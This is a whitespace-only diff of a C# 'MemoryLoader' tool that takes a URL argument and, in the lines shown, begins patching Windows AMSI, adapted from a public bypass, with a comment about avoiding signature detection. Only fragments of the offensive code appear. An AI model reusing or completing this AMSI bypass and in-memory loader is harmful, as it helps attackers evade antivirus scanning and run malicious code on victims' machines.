@@ -8,7 +8,7 @@ namespace MemoryLoader
 {
     class Program
     {
-        // Implement required kernel32.dll functions 
+        // Implement required kernel32.dll functions
         [DllImport("kernel32")]
         public static extern IntPtr LoadLibrary(string name);
         [DllImport("kernel32")]
@@ -19,7 +19,7 @@ namespace MemoryLoader
 
         static void Main(string[] args)
         {
-            
+
             if (args.Length != 1)
             {
                 Console.WriteLine("Usage: Loader.exe [URL]");
@@ -71,7 +71,7 @@ namespace MemoryLoader
             // Modified from: https://github.com/rasta-mouse/AmsiScanBufferBypass/blob/main/AmsiBypass.cs
 
             Console.WriteLine("Patching AMSI...");
-            
+
             // Get the DLL. Absolute path isn't flagged by signature detection
             var library = LoadLibrary("C:\\Windows\\System32\\amsi.dll");
 
